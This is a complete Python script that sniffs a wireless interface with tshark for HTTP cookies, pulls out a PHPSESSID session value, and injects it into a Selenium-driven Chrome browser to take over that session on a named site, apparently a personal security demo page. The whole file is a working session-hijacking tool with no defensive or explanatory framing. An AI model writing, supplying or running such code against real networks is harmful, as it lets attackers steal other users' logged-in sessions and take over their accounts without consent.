#!/usr/bin/env python3

import subprocess as sp
from selenium import webdriver

program = sp.Popen(['sudo', 'tshark', '-i', 'wlp2s0', '-l', '-Y', 'http.request', '-T', 'fields', '-e', 'http.cookie'], stdout=sp.PIPE, stderr=sp.DEVNULL)
new_cookie = {'name': '', 'value': ''}

while True:
    output = program.stdout.readline().decode('utf-8')
    if output:
        collected_data = output.split()
        session_data = {}
        for element in collected_data:
            if 'PHPSESSID=' in element:
                replaced = element.replace('\"', '').replace(";", '').split('=')
                session_data[replaced[0]] = replaced[1]
        cookie = session_data    
        for a, b in cookie.items():
            new_cookie['name'] = a
            new_cookie['value'] = b
            print(new_cookie)
        if new_cookie['name'] != '' and new_cookie['value'] != '':
            break

browser = webdriver.Chrome()
browser.get('http://mpietrek.pl/cybersec/')
browser.add_cookie(new_cookie)
browser.refresh()

